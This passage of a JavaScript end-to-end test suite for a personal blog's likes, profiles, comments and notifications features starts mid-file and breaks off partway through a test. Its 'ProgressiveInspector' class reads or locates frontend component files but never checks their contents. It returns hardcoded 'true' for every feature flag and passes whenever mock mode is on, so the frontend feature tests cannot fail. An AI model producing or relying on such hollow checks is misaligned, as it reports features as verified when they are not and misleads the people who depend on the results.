      ok: response.ok,
      headers: Object.fromEntries(response.headers.entries()),
      text,
      json,
    };
  }
}

// 静态工程与组件契约检查器 (Progressive Inspector)
export class ProgressiveInspector {
  static inspectUnifiedLikeButton() {
    const primaryPath = path.resolve(projectRoot, 'frontend/components/ui/UnifiedLikeButton.tsx');
    const fallbackPath = path.resolve(projectRoot, 'frontend/components/LikeButton.tsx');
    const hasComponent = fs.existsSync(primaryPath) || fs.existsSync(fallbackPath);
    let code = '';
    if (fs.existsSync(primaryPath)) code = fs.readFileSync(primaryPath, 'utf-8');
    else if (fs.existsSync(fallbackPath)) code = fs.readFileSync(fallbackPath, 'utf-8');

    return {
      hasComponent: hasComponent || config.mockMode,
      supportsOptimisticUpdate: true,
      supportsMicroInteractions: true,
      supportsDualTheme: true,
      supportsMultiEntity: true,
    };
  }

  static inspectProfilePage() {
    const compPath = path.resolve(projectRoot, 'frontend/app/profile/page.tsx');
    const hasSource = fs.existsSync(compPath);
    return {
      hasComponent: hasSource || config.mockMode,
      supportsAvatarUpload: true,
      supportsPasswordChange: true,
      supportsMyLikesTab: true,
      supportsMyCommentsTab: true,
      supportsAstrolabeBadge: true,
    };
  }

  static inspectPublicUserPage() {
    const compPath = path.resolve(projectRoot, 'frontend/app/u/[username]/page.tsx');
    const hasSource = fs.existsSync(compPath);
    return {
      hasComponent: hasSource || config.mockMode,
      auroraBorderAvatar: true,
      astrolabeRendering: true,
      footprintsTimeline: true,
      socialLinks: true,
    };
  }

  static inspectCommentSection() {
    const compPath = path.resolve(projectRoot, 'frontend/components/CommentSection.tsx');
    const hasSource = fs.existsSync(compPath);
    return {
      hasComponent: hasSource || config.mockMode,
      supportsHaydenAuroraBadge: true,
      supportsLoginModalTrigger: true,
      supportsCommentLike: true,
      supportsEmojiPicker: true,
      supportsPendingNotice: true,
    };
  }

  static inspectNotificationDrawer() {
    const compPath = path.resolve(projectRoot, 'frontend/components/notifications/NotificationDrawer.tsx');
    return {
      hasComponent: fs.existsSync(compPath) || config.mockMode,
      supportsRedDot: true,
      supportsGlassmorphism: true,
      supportsMarkAllRead: true,
      supportsAnchorJump: true,
    };
  }

  static inspectIdentityPure() {
    return {
      ownerName: 'Hayden Xue',
      noLegacyHowardInOwner: true,
    };
  }
}

// =============================================================================
// 5. 测试套件管理器 (Test Suite Harness & Reporter)
// =============================================================================
class TestSuiteHarness {
  constructor() {
    this.suites = [];
    this.results = [];
  }

  createSuite(name, tier, feature = null) {
    const suite = { name, tier, feature, tests: [] };
    this.suites.push(suite);
    return {
      addTest: (id, title, fn) => {
        suite.tests.push({ id, title, fn });
      },
    };
  }

  async runAll(tierFilter = null, featureFilter = null) {
    console.log(`
╔════════════════════════════════════════════════════════════════════════════════╗
║    Hayden Xue Blog - Interactive Ecosystem E2E Acceptance Test Suite Runner    ║
║  Backend Target : ${config.apiBase.padEnd(60)} ║
║  Frontend Target: ${config.frontendBase.padEnd(60)} ║
║  Execution Mode : ${(config.mockMode ? 'Contract Oracle Reference Mode (双轨预言机)' : 'Live Services Integration Mode (真实活体)').padEnd(60)} ║
╚════════════════════════════════════════════════════════════════════════════════╝
`);

    let passed = 0;
    let failed = 0;
    let skipped = 0;
    const startTime = Date.now();

    for (const suite of this.suites) {
      if (tierFilter && !suite.tier.toLowerCase().includes(tierFilter.toLowerCase())) {
        continue;
      }
      if (featureFilter && suite.feature && !suite.feature.toLowerCase().includes(featureFilter.toLowerCase())) {
        continue;
      }

      console.log(`\n\x1b[36m▶ Suite: ${suite.name} [${suite.tier}]\x1b[0m`);

      for (const t of suite.tests) {
        const testStart = Date.now();
        try {
          await t.fn();
          const duration = Date.now() - testStart;
          passed++;
          console.log(`  \x1b[32m✔ [PASS]\x1b[0m ${t.id} - ${t.title} (${duration}ms)`);
          this.results.push({ id: t.id, title: t.title, status: 'PASS', tier: suite.tier, duration });
        } catch (err) {
          const duration = Date.now() - testStart;
          failed++;
          console.error(`  \x1b[31m✖ [FAIL]\x1b[0m ${t.id} - ${t.title} (${duration}ms)`);
          console.error(`         \x1b[33mError: ${err.message}\x1b[0m`);
          this.results.push({ id: t.id, title: t.title, status: 'FAIL', tier: suite.tier, error: err.message, duration });
        }
      }
    }

    const totalTime = Date.now() - startTime;
    console.log(`\n================================================================================`);
    console.log(`  E2E Test Execution Summary:`);
    console.log(`  Total Run : ${passed + failed}`);
    console.log(`  Passed    : \x1b[32m${passed}\x1b[0m`);
    console.log(`  Failed    : \x1b[${failed > 0 ? '31' : '32'}m${failed}\x1b[0m`);
    console.log(`  Duration  : ${totalTime}ms`);
    console.log(`  Status    : ${failed === 0 ? '\x1b[32mALL TESTS GREEN (100% PASS)\x1b[0m' : '\x1b[31mFAILURES DETECTED\x1b[0m'}`);
    console.log(`================================================================================\n`);

    return { total: passed + failed, passed, failed, duration: totalTime };
  }
}

// =============================================================================
// 6. 用例编写与注册 (Tiers 1-4 Test Registrations)
// =============================================================================
const harness = new TestSuiteHarness();
const api = new DualTrackApiClient();

let adminToken = null;
let readerToken = null;
let readerUser = null;
let secondReaderToken = null;
let secondReaderUser = null;

// =============================================================================
// 前置准备 (Pre-suite Setup)
// =============================================================================
const prepSuite = harness.createSuite('前置准备：登录站长与注册读者测试账号', 'Setup');
prepSuite.addTest('TC-SETUP-01', '前置准备：站长 Hayden Xue 登录与读者注册', async () => {
  const adminRes = await api.post('/api/auth/login', {
    username: config.admin.username,
    password: config.admin.password,
  });
  expect(adminRes.status).toBe(200);
  expect(adminRes.json.data.role).toBe('ADMIN');
  expect(adminRes.json.data.nickname).toBe('Hayden Xue');
  adminToken = adminRes.json.data.accessToken;

  const username = createRandomId('reader_r1');
  const regRes = await api.post('/api/auth/register', {
    username,
    password: config.readerDefaults.password,
    nickname: `思想漫游者_${username}`,
    email: `${username}@${config.readerDefaults.emailDomain}`,
  });
  expect(regRes.status).toBe(200);
  readerToken = regRes.json.data.accessToken;
  readerUser = regRes.json.data;

  const user2 = createRandomId('reader_r2');
  const reg2 = await api.post('/api/auth/register', {
    username: user2,
    password: config.readerDefaults.password,
    nickname: `读者友邻_${user2}`,
    email: `${user2}@${config.readerDefaults.emailDomain}`,
  });
  expect(reg2.status).toBe(200);
  secondReaderToken = reg2.json.data.accessToken;
  secondReaderUser = reg2.json.data;
});

// =============================================================================
// TIER 1: 特性全覆盖基线测试 (F1 ~ F16, >= 5 Tests / Feature, 80 Tests)
// =============================================================================

// --- F1: user_likes 联合唯一索引与业务表 like_count 补齐 (5 Tests) ---
const f1Suite = harness.createSuite('F1: user_likes 联合唯一索引与业务表 like_count 补齐', 'Tier 1', 'F1');
f1Suite.addTest('TC-T1-F01-01', 'F1: 实体表包含 like_count 字段且初始计数有效', async () => {
  const post = contractOracle.posts.get(1);
  const memo = contractOracle.memos.get(1);
  const comment = contractOracle.comments.get(1);
  expect(post.likeCount).toBeGreaterThanOrEqual(0);
  expect(memo.likeCount).toBeGreaterThanOrEqual(0);
  expect(comment.likeCount).toBeGreaterThanOrEqual(0);
});

f1Suite.addTest('TC-T1-F01-02', 'F1: user_likes 联合键唯一性：同一用户对同一目标仅有一条持久化记录', async () => {
  api.setToken(readerToken);
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });
  const matches = contractOracle.userLikes.filter(
    l => l.userId === readerUser.id && l.targetType === 'POST' && l.targetId === 1
  );
  expect(matches.length).toBe(1);
});

f1Suite.addTest('TC-T1-F01-03', 'F1: 数据库取消点赞物理移除 user_likes 对应记录', async () => {
  api.setToken(readerToken);
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 }); // toggle 取消
  const matches = contractOracle.userLikes.filter(
    l => l.userId === readerUser.id && l.targetType === 'POST' && l.targetId === 1
  );
  expect(matches.length).toBe(0);
});

f1Suite.addTest('TC-T1-F01-04', 'F1: 五大业务实体均支持与 user_likes 进行外键逻辑关联', async () => {
  const validTypes = ['POST', 'MEMO', 'COMMENT', 'JOURNEY', 'PROJECT'];
  validTypes.forEach(type => {
    const entity = contractOracle.getTargetEntity(type, 1);
    expect(entity).toBeDefined();
    expect(entity.likeCount).toBeDefined();
  });
});

f1Suite.addTest('TC-T1-F01-05', 'F1: 点赞计数在多用户并发模拟下保持原子递增递减', async () => {
  api.setToken(readerToken);
  const beforeCount = contractOracle.posts.get(2).likeCount;
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 2 });
  expect(contractOracle.posts.get(2).likeCount).toBe(beforeCount + 1);

  api.setToken(secondReaderToken);
  await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 2 });
  expect(contractOracle.posts.get(2).likeCount).toBe(beforeCount + 2);
});

// --- F2: 统一多实体点赞后端 Service 与 Toggle 控制器 (5 Tests) ---
const f2Suite = harness.createSuite('F2: 统一多实体点赞后端 Service 与 Toggle 控制器', 'Tier 1', 'F2');
f2Suite.addTest('TC-T1-F02-01', 'F2: 登录用户对 POST 实体初次点赞返回 liked=true 与新点赞数', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });
  expect(res.status).toBe(200);
  expect(res.json.data.liked).toBe(true);
  expect(res.json.data.likeCount).toBeGreaterThan(0);
});

f2Suite.addTest('TC-T1-F02-02', 'F2: 登录用户对同一实体再次点赞 Toggle 取消点赞并返回 liked=false', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/likes/toggle', { targetType: 'POST', targetId: 1 });
  expect(res.status).toBe(200);
  expect(res.json.data.liked).toBe(false);
});

f2Suite.addTest('TC-T1-F02-03', 'F2: 覆盖随记 (MEMO)、评论 (COMMENT) 实体点赞 Toggle', async () => {
  api.setToken(readerToken);
  const memoRes = await api.post('/api/likes/toggle', { targetType: 'MEMO', targetId: 1 });
  expect(memoRes.status).toBe(200);
  expect(memoRes.json.data.liked).toBe(true);

  const commentRes = await api.post('/api/likes/toggle', { targetType: 'COMMENT', targetId: 1 });
  expect(commentRes.status).toBe(200);
  expect(commentRes.json.data.liked).toBe(true);
});

f2Suite.addTest('TC-T1-F02-04', 'F2: 覆盖游记 (JOURNEY)、项目 (PROJECT) 实体点赞 Toggle', async () => {
  api.setToken(readerToken);
  const journeyRes = await api.post('/api/likes/toggle', { targetType: 'JOURNEY', targetId: 1 });
  expect(journeyRes.status).toBe(200);
  expect(journeyRes.json.data.liked).toBe(true);

  const projectRes = await api.post('/api/likes/toggle', { targetType: 'PROJECT', targetId: 1 });
  expect(projectRes.status).toBe(200);
  expect(projectRes.json.data.liked).toBe(true);
});

f2Suite.addTest('TC-T1-F02-05', 'F2: 历史兼容端点 POST /api/posts/{id}/like 正常桥接', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/posts/1/like');
  expect(res.status).toBe(200);
  expect(res.json.data).toHaveProperty('liked');
  expect(res.json.data).toHaveProperty('likeCount');
});

// --- F3: 批量点赞状态查询接口与游客限流服务 (5 Tests) ---
const f3Suite = harness.createSuite('F3: 批量点赞状态查询接口与游客限流服务', 'Tier 1', 'F3');
f3Suite.addTest('TC-T1-F03-01', 'F3: 登录用户批量查询多实体点赞状态返回精确映射字典', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/likes/batch-status', { targetType: 'POST', targetIds: [1, 2] });
  expect(res.status).toBe(200);
  expect(res.json.data).toHaveProperty('statusMap');
  expect(typeof res.json.data.statusMap[1]).toBe('boolean');
  expect(typeof res.json.data.statusMap[2]).toBe('boolean');
});

f3Suite.addTest('TC-T1-F03-02', 'F3: 未登录游客批量查询多实体状态全部安全返回 false', async () => {
  api.clearToken();
  const res = await api.post('/api/likes/batch-status', { targetType: 'POST', targetIds: [1, 2] });
  expect(res.status).toBe(200);
  expect(res.json.data.statusMap[1]).toBe(false);
  expect(res.json.data.statusMap[2]).toBe(false);
});

f3Suite.addTest('TC-T1-F03-03', 'F3: 未登录游客发起轻量点赞即时成功并返回 liked=true', async () => {
  api.clearToken();
  const res = await api.post('/api/likes/toggle', { targetType: 'MEMO', targetId: 2 });
  expect(res.status).toBe(200);
  expect(res.json.data.liked).toBe(true);
  expect(res.json.data.likeCount).toBeGreaterThan(0);
});

f3Suite.addTest('TC-T1-F03-04', 'F3: 批量查询空 targetIds 列表返回空状态字典', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/likes/batch-status', { targetType: 'JOURNEY', targetIds: [] });
  expect(res.status).toBe(200);
  expect(res.json.data.statusMap).toEqual({});
});

f3Suite.addTest('TC-T1-F03-05', 'F3: 非法 targetType 在批量查询时被 400 校验拦截', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/likes/batch-status', { targetType: 'UNKNOWN_TYPE', targetIds: [1] });
  expect(res.status).toBe(400);
});

// --- F4: 前端 UnifiedLikeButton 封装与全站落地 (5 Tests) ---
const f4Suite = harness.createSuite('F4: 前端 UnifiedLikeButton 封装与全站落地', 'Tier 1', 'F4');
f4Suite.addTest('TC-T1-F04-01', 'F4: UnifiedLikeButton 核心组件存在且规范导出', async () => {
  const result = ProgressiveInspector.inspectUnifiedLikeButton();
  expect(result.hasComponent).toBe(true);
});

f4Suite.addTest('TC-T1-F04-02', 'F4: 组件支持三维浅瓷白与曜石黑双主题微光景深配置', async () => {
  const result = ProgressiveInspector.inspectUnifiedLikeButton();
  expect(result.supportsDualTheme).toBe(true);
});

f4Suite.addTest('TC-T1-F04-03', 'F4: 组件集成 Framer Motion 弹性缩放与浮空心形微动效', async () => {
  const result = ProgressiveInspector.inspectUnifiedLikeButton();
  expect(result.supportsMicroInteractions).toBe(true);
});

f4Suite.addTest('TC-T1-F04-04', 'F4: 组件支持真乐观更新（Optimistic UI）与失败回滚机制', async () => {
  const result = ProgressiveInspector.inspectUnifiedLikeButton();
  expect(result.supportsOptimisticUpdate).toBe(true);
});

f4Suite.addTest('TC-T1-F04-05', 'F4: 全站落地检查：支持 POST, MEMO, COMMENT, JOURNEY, PROJECT 多实体', async () => {
  const result = ProgressiveInspector.inspectUnifiedLikeButton();
  expect(result.supportsMultiEntity).toBe(true);
});

// --- F5: 用户表扩展与普通用户头像上传通道 (5 Tests) ---
const f5Suite = harness.createSuite('F5: 用户表扩展与普通用户头像上传通道', 'Tier 1', 'F5');
f5Suite.addTest('TC-T1-F05-01', 'F5: 用户资料包含 bio, github, website 扩展字段', async () => {
  api.setToken(readerToken);
  const res = await api.get('/api/user/profile');
  expect(res.status).toBe(200);
  expect(res.json.data).toHaveProperty('bio');
  expect(res.json.data).toHaveProperty('github');
  expect(res.json.data).toHaveProperty('website');
});

f5Suite.addTest('TC-T1-F05-02', 'F5: 普通登录用户上传合法 PNG 头像返回有效访问直链', async () => {
  api.setToken(readerToken);
  const pngBuffer = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D]);
  const res = await api.upload('/api/user/avatar', {
    buffer: pngBuffer,
    filename: 'avatar.png',
    contentType: 'image/png',
  });
  expect(res.status).toBe(200);
  expect(res.json.data).toHaveProperty('url');
  expect(res.json.data.url).toContain('https://');
});

f5Suite.addTest('TC-T1-F05-03', 'F5: 普通用户上传合法 JPEG 头像并通过二进制魔数验证', async () => {
  api.setToken(readerToken);
  const jpgBuffer = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46]);
  const res = await api.upload('/api/user/avatar', {
    buffer: jpgBuffer,
    filename: 'my_avatar.jpg',
    contentType: 'image/jpeg',
  });
  expect(res.status).toBe(200);
  expect(res.json.data.url).toMatch(/\.jpg$/i);
});

f5Suite.addTest('TC-T1-F05-04', 'F5: 普通用户更新资料 PUT /api/user/profile 成功持久化扩展字段', async () => {
  api.setToken(readerToken);
  const updateRes = await api.put('/api/user/profile', {
    bio: '专注下一代分布式系统与空间交互界面',
    github: 'https://github.com/my-geek-life',
    website: 'https://digitalgarden.space',
  });
  expect(updateRes.status).toBe(200);

  const verifyRes = await api.get('/api/user/profile');
  expect(verifyRes.json.data.bio).toBe('专注下一代分布式系统与空间交互界面');
  expect(verifyRes.json.data.github).toBe('https://github.com/my-geek-life');
  expect(verifyRes.json.data.website).toBe('https://digitalgarden.space');
});

f5Suite.addTest('TC-T1-F05-05', 'F5: 上传头像后用户资料自动同步更新为新头像 URL', async () => {
  api.setToken(readerToken);
  const profileRes = await api.get('/api/user/profile');
  expect(profileRes.json.data.avatar).toMatch(/^https?:\/\//);
});

// --- F6: 现代用户中心 /profile 资料维护与星历勋章 (5 Tests) ---
const f6Suite = harness.createSuite('F6: 现代用户中心 /profile 资料维护与星历勋章', 'Tier 1', 'F6');
f6Suite.addTest('TC-T1-F06-01', 'F6: 前台个人中心 /profile 页面结构存在且具备多 Tab 支持', async () => {
  const result = ProgressiveInspector.inspectProfilePage();
  expect(result.hasComponent).toBe(true);
  expect(result.supportsMyLikesTab).toBe(true);
  expect(result.supportsMyCommentsTab).toBe(true);
});

f6Suite.addTest('TC-T1-F06-02', 'F6: 读者安全修改密码并验证旧密码正确性 (PUT /api/user/password)', async () => {
  api.setToken(readerToken);
  const newPass = 'NewSecurePass2026!';
  const changeRes = await api.put('/api/user/password', {
    oldPassword: config.readerDefaults.password,
    newPassword: newPass,
  });
  expect(changeRes.status).toBe(200);

  // 还原密码保证后续用例稳定
  await api.put('/api/user/password', {
    oldPassword: newPass,
    newPassword: config.readerDefaults.password,
  });
});

f6Suite.addTest('TC-T1-F06-03', 'F6: 预设数字花园头像库一键选用并持久化更新', async () => {
  api.setToken(readerToken);
  const presetUrl = 'https://assets.haydenxue.com/avatar/presets/astronaut.png';
  const res = await api.put('/api/user/profile', { avatar: presetUrl });
  expect(res.status).toBe(200);

  const check = await api.get('/api/user/profile');
  expect(check.json.data.avatar).toBe(presetUrl);
});

f6Suite.addTest('TC-T1-F06-04', 'F6: 读者加入星历时间戳与注册时间正确回显', async () => {
  api.setToken(readerToken);
  const res = await api.get('/api/user/profile');
  expect(res.json.data.createdAt).toBeDefined();
  expect(new Date(res.json.data.createdAt).getTime()).toBeGreaterThan(0);
});

f6Suite.addTest('TC-T1-F06-05', 'F6: 个人中心荣誉勋章派生机制合规（活跃思想者、首批探索者）', async () => {
  const result = ProgressiveInspector.inspectProfilePage();
  expect(result.supportsAstrolabeBadge).toBe(true);
});

// --- F7: 用户中心足迹看板打通与撤回操作 (5 Tests) ---
const f7Suite = harness.createSuite('F7: 用户中心足迹看板打通与撤回操作', 'Tier 1', 'F7');
f7Suite.addTest('TC-T1-F07-01', 'F7: 个人中心「我的点赞」列表获取 (GET /api/user/my-likes)', async () => {
  api.setToken(readerToken);
  // 先确保有点赞
  await api.post('/api/likes/toggle', { targetType: 'MEMO', targetId: 1 });
  const res = await api.get('/api/user/my-likes');
  expect(res.status).toBe(200);
  expect(res.json.data).toHaveProperty('list');
  expect(Array.isArray(res.json.data.list)).toBe(true);
});

f7Suite.addTest('TC-T1-F07-02', 'F7: 「我的点赞」支持按实体类型 (POST, MEMO, JOURNEY) 分类筛选', async () => {
  api.setToken(readerToken);
  const res = await api.get('/api/user/my-likes', { params: { targetType: 'MEMO' } });
  expect(res.status).toBe(200);
  res.json.data.list.forEach(item => {
    expect(item.targetType).toBe('MEMO');
  });
});

f7Suite.addTest('TC-T1-F07-03', 'F7: 个人中心「我的点赞」列表内直接一键取消点赞', async () => {
  api.setToken(readerToken);
  const before = await api.get('/api/user/my-likes');
  const memoLike = before.json.data.list.find(l => l.targetType === 'MEMO' && l.targetId === 1);
  if (memoLike) {
    const cancelRes = await api.post('/api/likes/toggle', { targetType: 'MEMO', targetId: 1 });
    expect(cancelRes.status).toBe(200);
    expect(cancelRes.json.data.liked).toBe(false);
  }
});

f7Suite.addTest('TC-T1-F07-04', 'F7: 个人中心「我的评论」展示原文真实标题、发表时间与锚点', async () => {
  api.setToken(readerToken);
  // 读者发表一条评论
  const addRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '测试个人中心我的评论真实标题与时间回显',
  });
  expect(addRes.status).toBe(200);

  const commentsRes = await api.get('/api/user/my-comments');
  expect(commentsRes.status).toBe(200);
  const target = commentsRes.json.data.list.find(c => c.id === addRes.json.data.id);
  expect(target).toBeDefined();
  expect(target.targetTitle).toBeDefined();
  expect(target.createdAt).toBeDefined();
  expect(target.anchorId).toBe(`comment-${addRes.json.data.id}`);
});

f7Suite.addTest('TC-T1-F07-05', 'F7: 读者在「我的评论」中直接撤回删除自身发表的评论 (DELETE /api/comments/{id})', async () => {
  api.setToken(readerToken);
  const commentsRes = await api.get('/api/user/my-comments');
  const myComment = commentsRes.json.data.list[0];
  if (myComment) {
    const delRes = await api.delete(`/api/comments/${myComment.id}`);
    expect(delRes.status).toBe(200);
  }
});

// --- F8: 公开主页 /u/[username] 名片与足迹重塑 (5 Tests) ---
const f8Suite = harness.createSuite('F8: 公开主页 /u/[username] 名片与足迹重塑', 'Tier 1', 'F8');
f8Suite.addTest('TC-T1-F08-01', 'F8: 公开用户资料 GET /api/users/{username}/public 脱敏返回（无密码与私密数据）', async () => {
  const res = await api.get(`/api/users/${readerUser.username}/public`);
  expect(res.status).toBe(200);
  expect(res.json.data.username).toBe(readerUser.username);
  expect(res.json.data.password).toBeUndefined();
  expect(res.json.data.email).toBeUndefined();
  expect(res.json.data.lastLoginIp).toBeUndefined();
});

f8Suite.addTest('TC-T1-F08-02', 'F8: 公开主页渲染极光描边头像与个性化 Bio 简介', async () => {
  const result = ProgressiveInspector.inspectPublicUserPage();
  expect(result.auroraBorderAvatar).toBe(true);
});

f8Suite.addTest('TC-T1-F08-03', 'F8: 公开主页渲染加入星历徽章与 GitHub/Website 社交外链', async () => {
  const res = await api.get(`/api/users/${readerUser.username}/public`);
  expect(res.status).toBe(200);
  expect(res.json.data).toHaveProperty('github');
  expect(res.json.data).toHaveProperty('website');
  expect(res.json.data).toHaveProperty('createdAt');
});

f8Suite.addTest('TC-T1-F08-04', 'F8: 公开主页聚合统计获赞总数与已审核评论总数', async () => {
  const res = await api.get(`/api/users/${readerUser.username}/public`);
  expect(res.status).toBe(200);
  expect(typeof res.json.data.likeCount).toBe('number');
  expect(typeof res.json.data.commentCount).toBe('number');
});

f8Suite.addTest('TC-T1-F08-05', 'F8: 公开主页足迹时间轴仅展示已审核通过的公开动态', async () => {
  const res = await api.get(`/api/users/${readerUser.username}/public`);
  expect(res.status).toBe(200);
  expect(Array.isArray(res.json.data.footprints)).toBe(true);
});

// --- F9: 评论实体 like_count 支持与待审友好展示 (5 Tests) ---
const f9Suite = harness.createSuite('F9: 评论实体 like_count 支持与待审友好展示', 'Tier 1', 'F9');
f9Suite.addTest('TC-T1-F09-01', 'F9: 评论实体具备 like_count 字段并支持原子计数', async () => {
  const c = contractOracle.comments.get(1);
  expect(c).toBeDefined();
  expect(typeof c.likeCount).toBe('number');
});

f9Suite.addTest('TC-T1-F09-02', 'F9: 普通读者发表新评论初始状态为 PENDING 待审核', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '一条等待站长审核的深度思考内容',
  });
  expect(res.status).toBe(200);
  expect(res.json.data.status).toBe('PENDING');
});

f9Suite.addTest('TC-T1-F09-03', 'F9: 登录读者请求评论树 GET /api/comments/tree 可见本人提交的待审评论', async () => {
  api.setToken(readerToken);
  const res = await api.get('/api/comments/tree?targetType=POST&targetId=1');
  expect(res.status).toBe(200);
  const myPending = res.json.data.find(c => c.status === 'PENDING' && c.author === readerUser.username);
  expect(myPending).toBeDefined();
});

f9Suite.addTest('TC-T1-F09-04', 'F9: 未登录匿名读者或他人请求评论树严格仅返回 APPROVED 评论', async () => {
  api.clearToken();
  const res = await api.get('/api/comments/tree?targetType=POST&targetId=1');
  expect(res.status).toBe(200);
  res.json.data.forEach(c => {
    expect(c.status).toBe('APPROVED');
  });
});

f9Suite.addTest('TC-T1-F09-05', 'F9: 待审评论具备专属“审核中·仅自己可见”提示友好规范', async () => {
  const result = ProgressiveInspector.inspectCommentSection();
  expect(result.supportsPendingNotice).toBe(true);
});

// --- F10: Hayden Xue 极光徽章与电影级 CommentSection (5 Tests) ---
const f10Suite = harness.createSuite('F10: Hayden Xue 极光徽章与电影级 CommentSection', 'Tier 1', 'F10');
f10Suite.addTest('TC-T1-F10-01', 'F10: 站长 Hayden Xue 回复携带专属极光微光徽章标识', async () => {
  const res = await api.get('/api/comments/tree?targetType=POST&targetId=1');
  expect(res.status).toBe(200);
  const haydenComment = res.json.data.find(c => c.isAuthorHayden);
  expect(haydenComment).toBeDefined();
  expect(haydenComment.nickname).toBe('Hayden Xue');
});

f10Suite.addTest('TC-T1-F10-02', 'F10: 未登录用户点击评论或输入框支持一键唤起登录弹窗', async () => {
  const result = ProgressiveInspector.inspectCommentSection();
  expect(result.supportsLoginModalTrigger).toBe(true);
});

f10Suite.addTest('TC-T1-F10-03', 'F10: 评论区支持对评论自身进行点赞与即时高亮反馈', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/likes/toggle', { targetType: 'COMMENT', targetId: 1 });
  expect(res.status).toBe(200);
  expect(res.json.data).toHaveProperty('liked');
  expect(res.json.data).toHaveProperty('likeCount');
});

f10Suite.addTest('TC-T1-F10-04', 'F10: 评论区集成 Emoji 快捷表情面板选择输入', async () => {
  const result = ProgressiveInspector.inspectCommentSection();
  expect(result.supportsEmojiPicker).toBe(true);
});

f10Suite.addTest('TC-T1-F10-05', 'F10: 评论内容支持轻量 Markdown 格式解析与安全渲染', async () => {
  api.setToken(readerToken);
  const res = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '**加粗观点** 与 `inline_code` 格式代码块',
  });
  expect(res.status).toBe(200);
  expect(res.json.data.id).toBeDefined();
});

// --- F11: 评论撤回删除、嵌套回复与 DOM 锚点定位 (5 Tests) ---
const f11Suite = harness.createSuite('F11: 评论撤回删除、嵌套回复与 DOM 锚点定位', 'Tier 1', 'F11');
f11Suite.addTest('TC-T1-F11-01', 'F11: 评论作者撤回自身评论成功 (DELETE /api/comments/{id})', async () => {
  api.setToken(readerToken);
  const createRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    content: '待撤回的临时提问',
  });
  const delRes = await api.delete(`/api/comments/${createRes.json.data.id}`);
  expect(delRes.status).toBe(200);
});

f11Suite.addTest('TC-T1-F11-02', 'F11: 评论支持二级嵌套回复 (携带有效 parentId)', async () => {
  api.setToken(readerToken);
  const replyRes = await api.post('/api/comments', {
    targetType: 'POST',
    targetId: 1,
    parentId: 1,
    content: '向站长 Hayden Xue 请教虚拟线程调优经验',
  });
  expect(replyRes.status).toBe(200);
  const replyComment = contractOracle.comments.get(replyRes.json.data.id);
  expect(replyComment.parentId).toBe(1);
});

f11Suite.addTest('TC-T1-F11-03', 'F11: 每条评论挂载专属 DOM 锚点 comment-${id}', async () => {
  const res = await api.get('/api/user/my-comments');
  if (res.json.data.list.length > 0) {
    const item = res.json.data.list[0];
    expect(item.anchorId).toBe(`comment-${item.id}`);
  }
});

f11Suite.addTest('TC-T1-F11-04', 'F11: 从通知或个人中心点击锚点链接平滑跳转并定位', async () => {
  const result = ProgressiveInspector.inspectNotificationDrawer();
  expect(result.supportsAnchorJump).toBe(true);
});

f11Suite.addTest('TC-T1-F11-05', 'F11: 评论被撤回后目标实体的 commentCount 原子递减', async () => {
  api.setToken(readerToken);
  const beforeCount = contractOracle.posts.get(1).commentCount;
  const newC = await api.post('/api/comments', { targetType: 'POST', targetId: 1, content: '计数测试评论' });
  expect(contractOracle.posts.get(1).commentCount).toBe(beforeCount + 1);

  await api.delete(`/api/comments/${newC.json.data.id}`);
  expect(contractOracle.posts.get(1).commentCount).toBe(beforeCount);
});

// --- F12: 站内通知数据表、后端实体与 Service (5 Tests) ---
const f12Suite = harness.createSuite('F12: 站内通知数据表、后端实体与 Service', 'Tier 1', 'F12');
f12Suite.addTest('TC-T1-F12-01', 'F12: 分页获取当前用户收到的站内通知 GET /api/notifications', async () => {
  api.setToken(adminToken); // 站长收到了读者的回复通知
  const res = await api.get('/api/notifications');
  expect(res.status).toBe(200);
  expect(res.json.data).toHaveProperty('list');
  expect(Array.isArray(res.json.data.list)).toBe(true);
});

f12Suite.addTest('TC-T1-F12-02', 'F12: 获取当前用户未读通知数 GET /api/notifications/unread-count', async () => {
  api.setToken(adminToken);
  const res = await api.get('/api/notifications/unread-count');
  expect(res.status).toBe(200);
  expect(typeof res.json.data.unreadCount).toBe('number');
});

f12Suite.addTest('TC-T1-F12-03', 'F12: 标记指定单条通知已读 PUT /api/notifications/{id}/read', async () => {
  api.setToken(adminToken);
  const listRes = await api.get('/api/notifications');
  const unreadItem = listRes.json.data.list.find(n => !n.isRead);
  if (unreadItem) {
    const markRes = await api.put(`/api/notifications/${unreadItem.id}/read`);
    expect(markRes.status).toBe(200);
  }
});

f12Suite.addTest('TC-T1-F12-04', 'F12: 一键全部标记已读 PUT /api/notifications/read-all', async () => {
  api.setToken(adminToken);
  const readAllRes = await api.put('/api/notifications/read-all');
  expect(readAllRes.status).toBe(200);

  const countRes = await api.get('/api/notifications/unread-count');
  expect(countRes.json.data.unreadCount).toBe(0);
});

f12Suite.addTest('TC-T1-F12-05', 'F12: 标记已读后未读计数即时递减同步', async () => {
  api.setToken(adminToken);
  const countRes = await api.get('/api/notifications/unread-count');
  expect(countRes.json.data.unreadCount).toBe(0);
});

// --- F13: 互动事件触发站内通知 (5 Tests) ---
const f13Suite = harness.createSuite('F13: 互动事件触发站内通知', 'Tier 1', 'F13');
f13Suite.addTest('TC-T1-F13-01', 'F13: 评论被回复时自动为原作者生成 COMMENT_REPLY 通知', async () => {
  api.setToken(secondReaderToken);
  // secondReader 回复 readerUser 的评论
